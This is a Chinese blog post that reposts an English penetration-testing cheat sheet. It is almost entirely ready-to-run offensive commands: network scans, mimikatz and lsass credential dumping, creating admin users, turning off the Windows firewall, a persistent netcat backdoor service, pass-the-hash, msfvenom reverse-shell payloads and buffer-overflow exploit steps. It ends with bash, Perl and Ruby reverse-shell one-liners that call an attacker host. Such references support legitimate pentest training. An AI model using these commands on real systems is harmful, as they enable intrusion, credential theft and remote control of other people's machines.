<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="等我对自己很满意的时候，再预谋一场艳遇，岂不美哉。"><title>Pentest Tips and Tricks01 | 凉城Lc</title><link rel="stylesheet" type="text/css" href="//fonts.css.network/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.1"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.1"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Pentest Tips and Tricks01</h1><a id="logo" href="/.">凉城Lc</a><p class="description">真正的不自由，是在自己的心中设下牢笼</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/categories/漏洞描述"><i class="fa fa-star"> 漏洞描述</i></a><a href="/安全导航/"><i class="fa fa-share"> 安全导航</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Arama"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">Pentest Tips and Tricks01</h1><div class="post-meta"><a href="/2017/06/25/Pentest-Tips-and-Tricks01/#comments" class="comment-count"></a><p><span class="date">Jun 25, 2017</span><span><a href="/categories/渗透/" class="category">渗透</a></span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>点击</i></i></span></p></div><div class="post-content"><blockquote>
<p>渗透测试常用技巧和窍门第一部分，来自国外的EK， <a href="https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads" target="_blank" rel="noopener">看原文的走这</a>。</p>
</blockquote>
<h1 id="Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门"><a href="#Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门" class="headerlink" title="Pentest Tips and Tricks #01(渗透测试的技巧和窍门)"></a>Pentest Tips and Tricks #01(渗透测试的技巧和窍门)</h1><h2 id="Nmap-Full-Web-Vulnerable-Scan"><a href="#Nmap-Full-Web-Vulnerable-Scan" class="headerlink" title="Nmap Full Web Vulnerable Scan"></a><strong>Nmap Full Web Vulnerable Scan</strong></h2><pre><code>cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
</code></pre><a id="more"></a>
<h2 id="Dirb-Dir-Bruteforce-目录爆破"><a href="#Dirb-Dir-Bruteforce-目录爆破" class="headerlink" title="Dirb Dir Bruteforce(目录爆破)"></a>Dirb Dir Bruteforce(目录爆破)</h2><pre><code>dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
</code></pre><h2 id="Nikto-web-server-scanner-Niktoweb服务器扫描"><a href="#Nikto-web-server-scanner-Niktoweb服务器扫描" class="headerlink" title="Nikto web server scanner(Niktoweb服务器扫描)"></a>Nikto web server scanner(Niktoweb服务器扫描)</h2><pre><code>nikto -C all -h http://IP
</code></pre><h2 id="WordPress-Scanner-wordpress扫描"><a href="#WordPress-Scanner-wordpress扫描" class="headerlink" title="WordPress Scanner(wordpress扫描)"></a>WordPress Scanner(wordpress扫描)</h2><pre><code>git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan
./wpscan –url http://IP/ –enumerate p
</code></pre><h2 id="HTTP-Fingerprinting-HTTP指纹识别"><a href="#HTTP-Fingerprinting-HTTP指纹识别" class="headerlink" title="HTTP Fingerprinting(HTTP指纹识别)"></a>HTTP Fingerprinting(HTTP指纹识别)</h2><pre><code>wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt
</code></pre><h2 id="SKIP-Fish-Scanner"><a href="#SKIP-Fish-Scanner" class="headerlink" title="SKIP Fish Scanner"></a>SKIP Fish Scanner</h2><pre><code>skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
</code></pre><h2 id="Nmap-Ports-Scan"><a href="#Nmap-Ports-Scan" class="headerlink" title="Nmap Ports Scan"></a>Nmap Ports Scan</h2><pre><code>1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
2)fargement
3)data packed – like orginal one not scan packet
4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target
5)nmap –source-port 53 target
nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target (version detection)
nmap -sU -v target (Udp)
nmap -sU -P0 (Udp)
nmap -sC 192.168.31.10-12 (all scan default)
</code></pre><h2 id="NC-Scanning"><a href="#NC-Scanning" class="headerlink" title="NC Scanning"></a>NC Scanning</h2><pre><code>nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
</code></pre><h2 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h2><pre><code>us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

-H resolve hostnames during the reporting phase
-m scan mode (sf - tcp, U - udp)
-Iv - verbose
</code></pre><h2 id="Xprobe2-OS-fingerprinting-指纹识别"><a href="#Xprobe2-OS-fingerprinting-指纹识别" class="headerlink" title="Xprobe2 OS fingerprinting(指纹识别)"></a>Xprobe2 OS fingerprinting(指纹识别)</h2><pre><code>xprobe2 -v -p tcp:80:open IP
</code></pre><h2 id="Samba-Enumeration-samba枚举"><a href="#Samba-Enumeration-samba枚举" class="headerlink" title="Samba Enumeration(samba枚举)"></a>Samba Enumeration(samba枚举)</h2><pre><code>nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U &quot;&quot; target
enum4linux target
</code></pre><h2 id="SNMP-Enumeration-SNMP枚举"><a href="#SNMP-Enumeration-SNMP枚举" class="headerlink" title="SNMP Enumeration(SNMP枚举)"></a>SNMP Enumeration(SNMP枚举)</h2><pre><code>snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
</code></pre><h2 id="Windows-Useful-cmds"><a href="#Windows-Useful-cmds" class="headerlink" title="Windows Useful cmds"></a>Windows Useful cmds</h2><pre><code>net localgroup Users
net localgroup Administrators
search dir/s *.doc
system(&quot;start cmd.exe /k $cmd&quot;)
sc create microsoft_update binpath=&quot;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
</code></pre><h2 id="PuTTY-Link-tunnel-putty链接隧道"><a href="#PuTTY-Link-tunnel-putty链接隧道" class="headerlink" title="PuTTY Link tunnel(putty链接隧道)"></a>PuTTY Link tunnel(putty链接隧道)</h2><pre><code>Forward remote port to local address
plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP
</code></pre><h2 id="Meterpreter-portfwd"><a href="#Meterpreter-portfwd" class="headerlink" title="Meterpreter portfwd"></a>Meterpreter portfwd</h2><pre><code># https://www.offensive-security.com/metasploit-unleashed/portfwd/
# forward remote port to local address
meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali &gt; rdesktop 127.0.0.1:3389
</code></pre><h2 id="Enable-RDP-Access-激活rdp访问"><a href="#Enable-RDP-Access-激活rdp访问" class="headerlink" title="Enable RDP Access(激活rdp访问)"></a>Enable RDP Access(激活rdp访问)</h2><pre><code>reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
</code></pre><h2 id="Turn-Off-Windows-Firewall-关闭windows防火墙"><a href="#Turn-Off-Windows-Firewall-关闭windows防火墙" class="headerlink" title="Turn Off Windows Firewall(关闭windows防火墙)"></a>Turn Off Windows Firewall(关闭windows防火墙)</h2><pre><code>netsh firewall set opmode disable
</code></pre><h2 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h2><pre><code>a
# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
run getgui -u admin -p 1234
run vnc -p 5043
</code></pre><h2 id="Add-New-user-in-Windows"><a href="#Add-New-user-in-Windows" class="headerlink" title="Add New user in Windows"></a>Add New user in Windows</h2><pre><code>net user test 1234 /add
net localgroup administrators test /add
</code></pre><h2 id="Mimikatz-use"><a href="#Mimikatz-use" class="headerlink" title="Mimikatz use"></a>Mimikatz use</h2><pre><code>git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full
</code></pre><h2 id="Passing-the-Hash"><a href="#Passing-the-Hash" class="headerlink" title="Passing the Hash"></a>Passing the Hash</h2><pre><code>git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

or

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

or

meterpreter &gt; run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf &gt; use exploit/windows/smb/psexec
msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) &gt; exploit
meterpreter &gt; shell
</code></pre><h2 id="Hashcat-password-cracking"><a href="#Hashcat-password-cracking" class="headerlink" title="Hashcat password cracking"></a>Hashcat password cracking</h2><pre><code>hashcat -m 400 -a 0 hash /root/rockyou.txt
</code></pre><p>##　Netcat examples</p>
<pre><code>c:&gt; nc -l -p 31337
#nc 192.168.0.10 31337
c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt
#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt
</code></pre><h2 id="Banner-grabbing-with-NC"><a href="#Banner-grabbing-with-NC" class="headerlink" title="Banner grabbing with NC"></a>Banner grabbing with NC</h2><pre><code>nc 192.168.0.10 80
GET / HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/4.0
Referrer: www.example.com
&lt;enter&gt;
&lt;enter&gt;
</code></pre><h2 id="Window-reverse-shell"><a href="#Window-reverse-shell" class="headerlink" title="Window reverse shell"></a>Window reverse shell</h2><pre><code>c:&gt;nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:&gt;nc example.com 80 -e cmd.exe
nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
</code></pre><h2 id="Find-SUID-SGID-root-files"><a href="#Find-SUID-SGID-root-files" class="headerlink" title="Find SUID\SGID root files"></a>Find SUID\SGID root files</h2><pre><code># Find SUID root files
find / -user root -perm -4000 -print

# Find SGID root files:
find / -group root -perm -2000 -print

# Find SUID and SGID files owned by anyone:
find / -perm -4000 -o -perm -2000 -print

# Find files that are not owned by any user:
find / -nouser -print

# Find files that are not owned by any group:
find / -nogroup -print

# Find symlinks and what they point to:
find / -type l -ls
</code></pre><h2 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h2><pre><code>python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
</code></pre><h2 id="Python-Ruby-PHP-HTTP-Server"><a href="#Python-Ruby-PHP-HTTP-Server" class="headerlink" title="Python\Ruby\PHP HTTP Server"></a>Python\Ruby\PHP HTTP Server</h2><pre><code>python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&quot;
php -S 0.0.0.0:8888
</code></pre><h2 id="Get-PIDs-of-process"><a href="#Get-PIDs-of-process" class="headerlink" title="Get PIDs of process"></a>Get PIDs of process</h2><pre><code>fuser -nv tcp 80
fuser -k -n tcp 80
</code></pre><h2 id="Hydra-rdp-Bruteforce"><a href="#Hydra-rdp-Bruteforce" class="headerlink" title="Hydra rdp Bruteforce"></a>Hydra rdp Bruteforce</h2><pre><code>hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
</code></pre><h2 id="Mount-Remote-Windows-Share"><a href="#Mount-Remote-Windows-Share" class="headerlink" title="Mount Remote Windows Share"></a>Mount Remote Windows Share</h2><pre><code>smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
</code></pre><h2 id="Compiling-Exploit-in-Kali-在kali上编译漏洞"><a href="#Compiling-Exploit-in-Kali-在kali上编译漏洞" class="headerlink" title="Compiling Exploit in Kali(在kali上编译漏洞)"></a>Compiling Exploit in Kali(在kali上编译漏洞)</h2><pre><code>gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
</code></pre><h2 id="Compiling-Windows-Exploits-on-Kali-在kali上编译windows漏洞"><a href="#Compiling-Windows-Exploits-on-Kali-在kali上编译windows漏洞" class="headerlink" title="Compiling Windows Exploits on Kali(在kali上编译windows漏洞)"></a>Compiling Windows Exploits on Kali(在kali上编译windows漏洞)</h2><pre><code>wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
</code></pre><h2 id="NASM-Commands"><a href="#NASM-Commands" class="headerlink" title="NASM Commands"></a>NASM Commands</h2><pre><code>nasm -f bin -o payload.bin payload.asm
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
</code></pre><h2 id="SSH-Pivoting"><a href="#SSH-Pivoting" class="headerlink" title="SSH Pivoting"></a>SSH Pivoting</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target
</code></pre><h2 id="SSH-Pivoting-from-One-Network-to-Another"><a href="#SSH-Pivoting-from-One-Network-to-Another" class="headerlink" title="SSH Pivoting from One Network to Another"></a>SSH Pivoting from One Network to Another</h2><pre><code>ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
</code></pre><h2 id="Pivoting-Using-metasploit"><a href="#Pivoting-Using-metasploit" class="headerlink" title="Pivoting Using metasploit"></a>Pivoting Using metasploit</h2><pre><code>route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E

or

# https://www.offensive-security.com/metasploit-unleashed/pivoting/
meterpreter &gt; ipconfig
IP Address  : 10.1.13.3
meterpreter &gt; run autoroute -s 10.1.13.0/24
meterpreter &gt; run autoroute -p
10.1.13.0          255.255.255.0      Session 1
meterpreter &gt; Ctrl+Z
msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec
msf exploit(psexec) &gt; set RHOST 10.1.13.2
msf exploit(psexec) &gt; exploit
meterpreter &gt; ipconfig
IP Address  : 10.1.13.2
</code></pre><h2 id="Exploit-DB-search-using-CSV-File"><a href="#Exploit-DB-search-using-CSV-File" class="headerlink" title="Exploit-DB search using CSV File"></a>Exploit-DB search using CSV File</h2><pre><code>git clone https://github.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit –u
./searchsploit apache 2.2
./searchsploit &quot;Linux Kernel&quot;

cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3
</code></pre><h2 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c
</code></pre><h2 id="MSF-Linux-Reverse-Meterpreter-Binary"><a href="#MSF-Linux-Reverse-Meterpreter-Binary" class="headerlink" title="MSF Linux Reverse Meterpreter Binary"></a>MSF Linux Reverse Meterpreter Binary</h2><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell
</code></pre><h2 id="MSF-Reverse-Shell-C-Shellcode"><a href="#MSF-Reverse-Shell-C-Shellcode" class="headerlink" title="MSF Reverse Shell (C Shellcode)"></a>MSF Reverse Shell (C Shellcode)</h2><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c
</code></pre><h2 id="MSF-Reverse-Shell-Python-Script"><a href="#MSF-Reverse-Shell-Python-Script" class="headerlink" title="MSF Reverse Shell Python Script"></a>MSF Reverse Shell Python Script</h2><pre><code>msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
</code></pre><h2 id="MSF-Reverse-ASP-Shell"><a href="#MSF-Reverse-ASP-Shell" class="headerlink" title="MSF Reverse ASP Shell"></a>MSF Reverse ASP Shell</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp
</code></pre><h2 id="MSF-Reverse-Bash-Shell"><a href="#MSF-Reverse-Bash-Shell" class="headerlink" title="MSF Reverse Bash Shell"></a>MSF Reverse Bash Shell</h2><pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh
</code></pre><h2 id="MSF-Reverse-PHP-Shell"><a href="#MSF-Reverse-PHP-Shell" class="headerlink" title="MSF Reverse PHP Shell"></a>MSF Reverse PHP Shell</h2><pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php
add &lt;?php at the beginning
perl -i~ -0777pe&apos;s/^/&lt;?php \n/&apos; shell.php
</code></pre><h2 id="MSF-Reverse-Win-Bin"><a href="#MSF-Reverse-Win-Bin" class="headerlink" title="MSF Reverse Win Bin"></a>MSF Reverse Win Bin</h2><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe
</code></pre><h2 id="Linux-Security-Commands"><a href="#Linux-Security-Commands" class="headerlink" title="Linux Security Commands"></a>Linux Security Commands</h2><pre><code># find programs with a set uid bit
find / -uid 0 -perm -4000

# find things that are world writable
find / -perm -o=w

# find names with dots and spaces, there shouldn’t be any
find / -name &quot; &quot; -print
find / -name &quot;..&quot; -print
find / -name &quot;. &quot; -print
find / -name &quot; &quot; -print

# find files that are not owned by anyone
find / -nouser

# look for files that are unlinked
lsof +L1

# get information about procceses with open ports
lsof -i

# look for weird things in arp
arp -a

# look at all accounts including AD
getent passwd

# look at all groups and membership including AD
getent group

# list crontabs for all users including AD
for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done

# generate random passwords
cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=’|fold -w 12| head -n 4

# find all immutable files, there should not be any
find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’

# fix immutable files
chattr -i file
</code></pre><h2 id="Win-Buffer-Overflow-Exploit-Commands-windows缓冲区溢出漏洞命令"><a href="#Win-Buffer-Overflow-Exploit-Commands-windows缓冲区溢出漏洞命令" class="headerlink" title="Win Buffer Overflow Exploit Commands(windows缓冲区溢出漏洞命令)"></a>Win Buffer Overflow Exploit Commands(windows缓冲区溢出漏洞命令)</h2><pre><code>msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\x00&quot; -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\x00&quot; -f c

COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)

# Useful Commands:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b &quot;\x00\x0a&quot;
!mona pc 5000
!mona po EIP
!mona suggest
</code></pre><h2 id="SEH-Structured-Exception-Handling-结构化异常处理"><a href="#SEH-Structured-Exception-Handling-结构化异常处理" class="headerlink" title="SEH - Structured Exception Handling(结构化异常处理)"></a>SEH - Structured Exception Handling(结构化异常处理)</h2><pre><code># https://en.wikipedia.org/wiki/Microsoftspecific_exception_handling_mechanisms#SEH
!mona suggest
!mona nosafeseh
nseh=&quot;\xeb\x06\x90\x90&quot; (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
</code></pre><h2 id="ROP-DEP"><a href="#ROP-DEP" class="headerlink" title="ROP (DEP)"></a>ROP (DEP)</h2><pre><code># https://en.wikipedia.org/wiki/Return-oriented_programming
# https://en.wikipedia.org/wiki/Data_Execution_Prevention
!mona modules
!mona ropfunc -m *.dll -cpb &quot;\x00\x09\x0a&quot;
!mona rop -m *.dll -cpb &quot;\x00\x09\x0a&quot; (auto suggest)
</code></pre><h2 id="ASLR-Address-space-layout-randomization-ASLR地址空间布局随机化"><a href="#ASLR-Address-space-layout-randomization-ASLR地址空间布局随机化" class="headerlink" title="ASLR - Address space layout randomization(ASLR地址空间布局随机化)"></a>ASLR - Address space layout randomization(ASLR地址空间布局随机化)</h2><pre><code># https://en.wikipedia.org/wiki/Address_space_layout_randomization
!mona noaslr
</code></pre><h2 id="EGG-Hunter-techniques"><a href="#EGG-Hunter-techniques" class="headerlink" title="EGG Hunter techniques"></a>EGG Hunter techniques</h2><pre><code># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward -60)
buff=lxxllxxl+shell
!mona egg -t &apos;w00t&apos;
</code></pre><h2 id="GDB-Debugger-Commands"><a href="#GDB-Debugger-Commands" class="headerlink" title="GDB Debugger Commands"></a>GDB Debugger Commands</h2><pre><code># Setting Breakpoint
break *_start

# Execute Next Instruction
next
step
n
s

# Continue Execution
continue
c

# Data
checking &apos;REGISTERS&apos; and &apos;MEMORY&apos;

# Display Register Values: (Decimal,Binary,Hex)
print /d –&gt; Decimal
print /t –&gt; Binary
print /x –&gt; Hex
O/P :
(gdb) print /d $eax
$17 = 13
(gdb) print /t $eax
$18 = 1101
(gdb) print /x $eax
$19 = 0xd
(gdb)

# Display values of specific memory locations
command : x/nyz (Examine)
n –&gt; Number of fields to display ==&gt;
y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)
z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)
</code></pre><h2 id="BASH-Reverse-Shell"><a href="#BASH-Reverse-Shell" class="headerlink" title="BASH Reverse Shell"></a>BASH Reverse Shell</h2><pre><code>bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1

exec /bin/bash 0&amp;0 2&gt;&amp;0
exec /bin/bash 0&amp;0 2&gt;&amp;0

0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196

0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196

exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done
exec 5&lt;&gt;/dev/tcp/attackerip/4444

cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:
while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done

/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1
/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1
</code></pre><h2 id="PERL-Reverse-Shell"><a href="#PERL-Reverse-Shell" class="headerlink" title="PERL Reverse Shell"></a>PERL Reverse Shell</h2><pre><code>perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;

# for win platform
perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;
perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};’
</code></pre><h2 id="RUBY-Reverse-Shell"><a href="#RUBY-Reverse-Shell" class="headerlink" title="RUBY Reverse Shell"></a>RUBY Reverse Shell</h2><pre><code>ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;

# for win platform
ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;
ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;
